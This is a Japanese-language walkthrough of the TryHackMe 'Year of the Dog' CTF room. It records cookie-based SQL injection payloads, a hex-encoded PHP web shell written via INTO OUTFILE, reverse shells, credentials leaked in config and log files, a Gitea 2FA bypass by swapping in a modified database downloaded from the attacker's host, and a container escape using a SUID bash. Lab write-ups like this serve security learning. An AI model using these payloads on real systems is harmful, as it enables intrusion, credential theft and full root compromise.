# Year of the Dog CTF

https://tryhackme.com/room/yearofthedog

## Enumeration

```shell
TARGET=10.48.180.4
sudo bash -c "echo $TARGET   dog.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

SSH, HTTPのみ。

### ディレクトリ列挙

dirsearch で config.php を発見（0バイト）

パラメータファジングしたが何も出なかった。

```sh
ffuf -u 'http://dog.thm/config.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
ffuf -u 'http://dog.thm/config.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fs 0
ffuf -u 'http://dog.thm/config.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -fs 0
```

POSTでも何も出なかった。

```sh
ffuf -u 'http://dog.thm/config.php' -X POST -d 'FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
ffuf -u 'http://dog.thm/config.php' -X POST -d 'FUZZ=1' -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fs 0
ffuf -u 'http://dog.thm/config.php' -X POST -d 'FUZZ=1' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -fs 0
```

## /index.php

Cookieの値をランダムに変えると、キューの数字の部分にErrorと表示される。

```
Cookie: id=af25020f0e676144572ba7ead705c8a6

You are number 24 in the queue
```

```
Cookie: id=af25020f0e676144572ba7ead705c8a5

You are number Error in the queue
```

何度かリクエストを繰り返し、次に24という数字が出たとき、Cookieの値は前回とは異なっていた。

```
Set-Cookie: id=1652a343a0192f3f06a19c0bfe38fc0b; path=/
You are number 24 in the queue
```

Cookieの値を下記にしたところ、SQL構文エラーが表示された。つまりSQLインジェクションの脆弱性がある。

```
Cookie: id='id;

Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'id'' at line 1
```

### SQLi

下記でエラー発生しない。Select数は2、かつ画面表示されているのは2列目。

```
Cookie: id=' union select 1,2-- -

You are number 2 in the queue
```

db名は webapp

```
Cookie: id=' union select 1,database()-- -

You are number webapp in the queue
```

queue テーブルのみ。

```
Cookie: id=' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'webapp'-- -

You are number queue in the queue
```

列名は userID, queueNum

```
Cookie: id=' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'queue'-- -

You are number userID,queueNum in the queue
```

データ数が6万件以上もあり、何かを見つけるのが困難。役に立つものが入っているのかも不明。

```
Cookie: id=' UNION SELECT 1,group_concat(userID,':',queueNum SEPARATOR ',') FROM queue-- -

You are number 00007fa973bb4000d170bf4d4e4b5a61:96,0002166128071b7f204836beb2848a4b:30,000306b183ff117cb3e4aa2f8c684116:42,0003cb09d172a2565a65aec798b052bd:9,0004ca186c9379bac5af708892f035e9:5,0004ca9c5e172d331d3c429804a21274:27,00053c19931deebfb435ce51279b1f66:10,0007b424e935133837969f796946c8bc:46,000869b3ce03b085c61a12a55e707007:7,0008a32a1580a1e393be519dbc0339b5:71,0008bb46a46854006d4a1b755163c4bc:25,000a2a11d2c5186a158b459afa7265f0:76,000abf3464c5ee630566148f2241bf42:18,000b2ccd0ce1da6fb62b79f29f313470:30,000be7019b78a7f55bd068e3cab39bde:39,000c760c57c77675db7ada1004267ff4:30,000cdbc85b10b2d9e793f5c71f0c8343:55,000fb134adb29664adb8242f40af6828:72,001033f16f566124c845f9e13a92da90:72,00106e339017ff015fb5551d1221ad58:22,0012c2285288b373df4e5c1c3a30c6c1:49,00135b9d5b94d09a40f1fea5cc5ce12a:26,0013f8f7060028c0187ba6a985480f6f:19,0014cd3ab4de6265358dc200fcbad3df:44,00156f13d4a0f52104370930aa96c3e7:53,0015d51828aba9ce8568c0a70ad383c8:46,00161cc482ff9d7cdcd04a525c308c12:80,0016e6eaab2df2e6e4ee3e8a71c51496:96,0016fc9b7a8c64e40b0 in the queue
```

a-f以外の文字が含まれていないのでデータ自体は役に立たないと判断。

```
Cookie: id=' UNION SELECT 1,count(userID) FROM queue where userID REGEXP '[g-z]'-- -

You are number 0 in the queue
```

思いつくのは、sqlmap でシェルを実行する機能。  
<, > をフィルターするWAFがあるようなので、sqlmap で between タンパーを試したが、動作しなかった。

```sh
$ sqlmap -u "http://dog.thm/index.php" --cookie="id=100038288985085f5a6f59e4c358b6a3" --level=2 --batch -D webapp -T queue --tamper=between --dump
```

ここでギブアップしてウォークスルーを読んだ。

SQLiを利用してシェルを取得するアイデアの方向性は合っていたが、sqlmapを使わずに自力で実行する。

INTO OUTFILE を使ったシェルアップロード

```sql
Cookie: id=' UNION SELECT 1,2 INTO OUTFILE '/var/www/html/shell2.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```

実行

```sh
$ curl http://dog.thm/shell2.php?cmd=whoami 
100038288985085f5a6f59e4c358b6a3        43<pre>www-data
</pre>
```

リバースシェル取得

```sh
$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.129.39] from (UNKNOWN) [10.48.180.4] 42568
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

config.php

```sh
www-data@year-of-the-dog:/var/www/html$ cat config.php
<?php
        $servername = "localhost";
        $username = "web";
        $password = "Cda3RsDJga";
        $dbname = "webapp";

        $dbh = new mysqli($servername, $username, $password, $dbname);
        if ($dbh->connect_error){
                die("Connection failed: ". $dbh->connect_error);
        }


?>
```

dylan に昇格する必要がある。

```sh
www-data@year-of-the-dog:/home/dylan$ ls -al
total 120
drwxr-xr-x 4 dylan dylan  4096 Sep  5  2020 .
drwxr-xr-x 3 root  root   4096 Sep  3  2020 ..
lrwxrwxrwx 1 dylan dylan     9 Sep  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 dylan dylan   220 Sep  3  2020 .bash_logout
-rw-r--r-- 1 dylan dylan  3771 Sep  3  2020 .bashrc
drwx------ 2 dylan dylan  4096 Sep  3  2020 .cache
-rw-rw-r-- 1 dylan dylan    53 Sep  5  2020 .gitconfig
drwx------ 3 dylan dylan  4096 Sep  3  2020 .gnupg
lrwxrwxrwx 1 root  root      9 Sep  3  2020 .mysql_history -> /dev/null
-rw-r--r-- 1 dylan dylan   807 Sep  3  2020 .profile
-rw-r--r-- 1 dylan dylan     0 Sep  3  2020 .sudo_as_admin_successful
-r-------- 1 dylan dylan    38 Sep  5  2020 user.txt
-rw-r--r-- 1 dylan dylan 85134 Sep  5  2020 work_analysis
```

```sh
www-data@year-of-the-dog:/home/dylan$ cat .gitconfig
[user]
        name = Dylan
        email = dylan@yearofthedog.thm
```

巨大なログファイル。ハニーポットか何か？

```sh
www-data@year-of-the-dog:/home/dylan$ cat ./work_analysis 
Sep  5 20:52:34 staging-server sshd[39184]: Received disconnect from 192.168.1.142 port 45582:11: Bye Bye [preauth]
Sep  5 20:52:34 staging-server sshd[39184]: Disconnected from authenticating user root 192.168.1.142 port 45582 [preauth]
Sep  5 20:52:35 staging-server sshd[39190]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
Sep  5 20:52:35 staging-server sshd[39191]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
Sep  5 20:52:35 staging-server sshd[39194]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root
...
```

3000ポートをローカルでリッスンしている。curlを実行したところ、giteaのログイン画面と思われる。

```sh
www-data@year-of-the-dog:/home/dylan$ ss -nltp
State                          Recv-Q                          Send-Q                                                    Local Address:Port                                                      Peer Address:Port                          
LISTEN                         0                               80                                                            127.0.0.1:3306                                                           0.0.0.0:*                             
LISTEN                         0                               128                                                       127.0.0.53%lo:53                                                             0.0.0.0:*                             
LISTEN                         0                               128                                                             0.0.0.0:22                                                             0.0.0.0:*                             
LISTEN                         0                               128                                                           127.0.0.1:3000                                                           0.0.0.0:*                             
LISTEN                         0                               128                                                           127.0.0.1:45883                                                          0.0.0.0:*                             
LISTEN                         0                               128                                                                   *:80                                                                   *:*                             
LISTEN                         0                               128                                                                [::]:22                                                                [::]:* 
```

gitea はdylanが実行している。

```sh
dylan     1284  0.3 16.9 930912 170660 ?       Ssl  04:37   0:33 /app/gitea/gitea web
```

トンネリングして接続。

```sh
ssh tunnel@192.168.129.39 -R 3000:localhost:3000 -N
```

Gitea バージョン

```
owered by Gitea Version: 1.13.0+dev-542-gbc11caff9
```

フルネームは Dylan Anderson であることが判明。隙が見つからないのでローカルに戻る。

gitead.db を発見。

```sh
www-data@year-of-the-dog:/gitea/gitea$ ls -al
total 1224
drwxr-xr-x 9 dylan dylan    4096 Feb 12 07:40 .
drwxr-xr-x 5 root  root     4096 Sep  5  2020 ..
drwxr-xr-x 2 dylan dylan    4096 Sep  5  2020 attachments
drwxr-xr-x 2 dylan dylan    4096 Sep  5  2020 avatars
drwxr-xr-x 2 dylan dylan    4096 Sep  5  2020 conf
-rw-r--r-- 1 dylan dylan 1212416 Feb 12 07:40 gitea.db
drwxr-xr-x 4 dylan dylan    4096 Sep  5  2020 indexers
drwxr-xr-x 2 dylan dylan    4096 Sep  6  2020 log
drwxr-xr-x 6 dylan dylan    4096 Sep  5  2020 queues
drwx------ 7 dylan dylan    4096 Feb 12 07:35 sessions
```

パスワードハッシュ等を読めたが、取り扱い方法不明。そもそもArgon2なのでハッシュからのクラックは無理と思われる。

```sh
passwordhash
f2fd45caa2f5eae17cb5faa06eb57c4ad05532550fe37ae99e2245429757af09350be12abba616de4e8f0e37d223bd327261

hash_algo
argon2

rands
Rs6zSrVgx0

salt
vkA9FTpZ72
```

work_analysis をよく見ると、dylanのパスワードと思われるものが出ていた。

```sh
www-data@year-of-the-dog:/home/dylan$ grep dylan ./work_analysis 
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user [REDACTED] from 192.168.1.142 port 45624 ssh2
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user [REDACTED] 192.168.1.142 port 45624 [preauth]
```

SSH接続成功。  
gitea もこのパスワードと同じだったが、2FAのためログインはできなかった。

## 権限昇格２

gitea.db で、two_factor テーブルのデータを削除してファイルを上書きしたら2FAを要求されず、dylanとしてログインできた。

```sh
dylan@year-of-the-dog:/gitea/gitea$ curl http://192.168.129.39:8000/gitea.db -o /gitea/gitea/gitea.db
```

Update GitHooks を編集できるので、READMEのコミットによりコマンドを実行できる。

リバースシェル取得

```sh
$ nc -lnvp 6666           
listening on [any] 6666 ...
connect to [192.168.129.39] from (UNKNOWN) [10.48.165.106] 38051
sh: can't access tty; job control turned off
/data/git/repositories/dylan/test-repo.git $ 
```

giteaはバイナリファイル。ELF 64-bit LSB executableだった。

```sh
/app/gitea $ ls -al
total 85436
drwxr-xr-x    1 git      git           4096 Sep  5  2020 .
drwxr-xr-x    1 root     root          4096 Sep  5  2020 ..
-rwxr-xr-x    1 git      git       87466032 Sep  5  2020 gitea
```

ゲストOSのrootにはなれる。

```sh
/app/gitea $ sudo -l
User git may run the following commands on 42040a8f97fc:
    (ALL) NOPASSWD: ALL
```

特権コンテナではない。

```sh
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

/data が、ホストOSの /gitea と同じ内容。

```sh
ls -al /data
total 20
drwxr-xr-x    5 root     root          4096 Sep  5  2020 .
drwxr-xr-x    1 root     root          4096 Sep  5  2020 ..
drwxr-xr-x    5 git      git           4096 Sep  5  2020 git
drwxr-xr-x   10 git      git           4096 Feb 13 04:12 gitea
drwx------    2 root     root          4096 Sep  5  2020 ssh
```

ホストOS側でbashをコピー。

```sh
dylan@year-of-the-dog:/gitea/git$ cp /bin/bash /gitea/git/bash
```

ゲスト側からbashが見えた。

```sh
ls -al
total 1112
drwxr-xr-x    5 git      git           4096 Feb 13 04:46 .
drwxr-xr-x    5 root     root          4096 Sep  5  2020 ..
-rw-r--r--    1 git      git            162 Sep  5  2020 .gitconfig
drwx------    2 git      git           4096 Sep  5  2020 .ssh
-rwxr-xr-x    1 git      git        1113504 Feb 13 04:46 bash
drwxr-xr-x    2 git      git           4096 Sep  5  2020 lfs
drwxr-xr-x    3 git      git           4096 Sep  5  2020 repositories
```

ゲスト側から、bash を root のSUID付きに変更する。

```sh
chown root:root ./bash
chmod +sx ./bash
ls -al
total 1112
drwxr-xr-x    5 git      git           4096 Feb 13 04:46 .
drwxr-xr-x    5 root     root          4096 Sep  5  2020 ..
-rw-r--r--    1 git      git            162 Sep  5  2020 .gitconfig
drwx------    2 git      git           4096 Sep  5  2020 .ssh
-rwsr-sr-x    1 root     root       1113504 Feb 13 04:46 bash
drwxr-xr-x    2 git      git           4096 Sep  5  2020 lfs
drwxr-xr-x    3 git      git           4096 Sep  5  2020 repositories
```

ホスト側からもSUIDが付いている。

```sh
dylan@year-of-the-dog:/gitea/git$ ls -al
total 1112
drwxr-xr-x 5 dylan dylan    4096 Feb 13 04:46 .
drwxr-xr-x 5 root  root     4096 Sep  5  2020 ..
-rwsr-sr-x 1 root  root  1113504 Feb 13 04:46 bash
-rw-r--r-- 1 dylan dylan     162 Sep  5  2020 .gitconfig
drwxr-xr-x 2 dylan dylan    4096 Sep  5  2020 lfs
drwxr-xr-x 3 dylan dylan    4096 Sep  5  2020 repositories
drwx------ 2 dylan dylan    4096 Sep  5  2020 .ssh
```

昇格成功！

```sh
dylan@year-of-the-dog:/gitea/git$ ./bash -p
bash-4.4# id
uid=1000(dylan) gid=1000(dylan) euid=0(root) egid=0(root) groups=0(root),1000(dylan)
bash-4.4# ls -al /root
total 28
drwx------  4 root root 4096 Sep  6  2020 .
drwxr-xr-x 23 root root 4096 May 31  2021 ..
lrwxrwxrwx  1 root root    9 Sep  3  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Sep  3  2020 .cache
drwx------  3 root root 4096 Sep  3  2020 .gnupg
lrwxrwxrwx  1 root root    9 Sep  6  2020 .mysql_history -> /dev/null
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   38 Sep  5  2020 root.txt
```

## 振り返り

- SQLi で（手作業で）シェルをアップロードするのは初見で良い勉強になった。
- auth.log やそれに類するものを発見した場合、ユーザー名のところに誤ってパスワードが記録されていないか注意する必要があると学んだ。
- このエスケープのパターンは、共有ディレクトリを見つけられるかどうかが勝負になる。ゲスト側から共有ディレクトリを発見する方法を調べた。

### ゲスト側から共有ディレクトリを発見する方法

```sh
cat /proc/self/mountinfo

...
485 465 202:1 /gitea /data rw,relatime - ext4 /dev/xvda1 rw,errors=remount-ro,data=ordered
...
```

## Tags

#tags:SQLインジェクション #tags:Gitea #tags:docker
